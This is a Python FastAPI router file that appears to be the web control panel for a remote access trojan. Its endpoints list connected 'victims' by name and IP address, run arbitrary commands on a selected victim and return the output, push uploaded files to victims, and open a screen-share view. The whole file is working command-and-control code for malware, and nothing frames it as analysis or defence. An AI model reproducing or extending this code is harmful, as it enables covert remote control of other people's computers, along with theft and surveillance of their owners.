from fastapi import Depends, APIRouter, UploadFile, File
from fastapi.responses import HTMLResponse
from auth.dependencies import *
from models.user import User
from host.server import RAT_SERVER
import urllib.parse
import os
import cv2

app = APIRouter()


@app.get("/clients")
async def read_users_me():

    prettyClients = []
    print(RAT_SERVER.instance.victims)
    for client in RAT_SERVER.instance.victims:
        prettyClients.append(
            {"name": client["Name"], "ip": client["IPv4"], "status": "Online", "uuid": client["ID"]})

    return {"clients": prettyClients}


@app.get("/clients/{id}")
async def read_user_me(id: str):

    for client in RAT_SERVER.instance.victims:
        if client["ID"] == id:
            return {"client": client}

    return {"client": "Not found"}


@app.post("/clients/{id}/command")
async def execute_command(id: str, command_type: str, command: str):
    # if current_user:

    print(f"[*] Received command {command} of type {command_type} for {id}")
    command = urllib.parse.unquote(command)

    for victim in RAT_SERVER.instance.victims:
        if victim["ID"] == id:
            # Now for the client, we want to get the index of our current victim, and get the index relative to the betterVictimsList
            victimIndex = RAT_SERVER.instance.victims.index(victim)

            client = RAT_SERVER.instance.clients[victimIndex]

            RAT_SERVER.instance.execute(command_type, command, client[0])
            output = RAT_SERVER.instance.receive_output(client[0])

            if output is None:
                return {"output": "Error: Output not received"}
            return {"output": output}
    return {"output": "Error: Client not found"}


@app.post("/clients/{id}/upload")
async def upload_file(id: str, file: UploadFile = File(...)):
    for victim in RAT_SERVER.instance.victims:
        if victim["ID"] == id:
            # Now for the client, we want to get the index of our current victim, and get the index relative to the betterVictimsList
            victimIndex = RAT_SERVER.instance.victims.index(victim)

            client = RAT_SERVER.instance.clients[victimIndex]

            RAT_SERVER.instance.upload_file(file, client[0])
            return {"output": "File uploaded successfully"}
    return {"output": "Error: Client not found"}


@app.get("/clients/{id}/screenshare")
async def start_screenshare(id: str):
    for victim in RAT_SERVER.instance.victims:
        if victim["ID"] == id:
            # Now for the client, we want to get the index of our current victim, and get the index relative to the betterVictimsList
            victimIndex = RAT_SERVER.instance.victims.index(victim)
            print("Starting screenshare")

            return HTMLResponse(content=f"<video width='320' height='240' controls><source src='http://localhost:8000/clients/{id}/video' type='video/mp4'></video>", status_code=200)
    return {"output": "Error: Client not found"}
